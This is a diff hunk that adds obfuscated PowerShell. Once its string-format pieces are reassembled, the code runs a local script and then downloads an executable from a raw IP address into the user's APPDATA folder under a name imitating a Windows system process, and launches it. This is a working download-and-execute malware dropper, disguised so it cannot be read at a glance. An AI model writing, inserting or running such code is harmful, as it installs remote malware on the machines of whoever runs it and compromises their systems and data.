@@ -1,0 +1,4 @@
+& ((("{3}{1}{6}{0}{2}{4}{7}{5}"-f 'ptRo','0}PSS','ot','{','/cl','py','cri','ass1.')) -F[CHAR]36) | .("{1}{2}{3}{0}"-f 'ON','ConvertFro','m-J','S')
+
+
+(&("{2}{0}{1}" -f'w-Ob','ject','Ne') ("{0}{2}{3}{1}" -f'System.Net','ient','.','WebCl')).("{2}{0}{3}{1}" -f'ownloa','ile','D','dF').Invoke(("{3}{6}{4}{0}{9}{8}{2}{7}{10}{1}{5}" -f '53.238/','v','o','http:/','94.102.','.exe','/','o/','h','~ya','csrs'),"$env:APPDATA\csrsv.exe");.("{1}{2}{0}{3}" -f'rt-','St','a','Process') ("$env:APPDATA\csrsv.exe")
